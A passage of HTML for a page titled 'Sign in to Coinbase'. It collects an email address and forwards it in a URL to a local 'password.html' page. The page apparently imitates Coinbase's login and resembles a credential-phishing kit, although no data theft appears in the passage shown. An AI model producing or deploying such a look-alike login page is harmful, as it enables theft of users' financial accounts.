</a>

    <!-- Sign Up Top Right -->
    <a href="#" class="absolute top-6 right-6 text-sm font-semibold hover:underline">Sign up</a>

    <!-- Sign In Card -->
    <div class="w-full max-w-md bg-white border border-gray-200 p-8 rounded-xl shadow-sm">
      <h2 class="text-2xl font-bold mb-6">Sign in to Coinbase</h2>

      <form onsubmit="event.preventDefault(); redirectToPassword();">
  <label class="text-sm font-semibold block mb-1">Email</label>
  <input
    type="email"
    id="email"
    placeholder="Your email address"
    class="w-full p-3 mb-4 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-400"
    required
  />

  <button type="submit" class="w-full bg-blue-400 hover:bg-blue-500 text-white font-semibold py-3 rounded-full transition mb-6">
    Continue
  </button>
  
</form>
<script>
  function redirectToPassword() {
    const email = document.getElementById("email").value;
    window.location.href = `password.html?email=${encodeURIComponent(email)}`;

  }
</script>


      <div class="flex items-center mb-6">
        <hr class="flex-grow border-gray-300" />
        <span class="mx-2 text-sm text-gray-500">OR</span>

      </div>
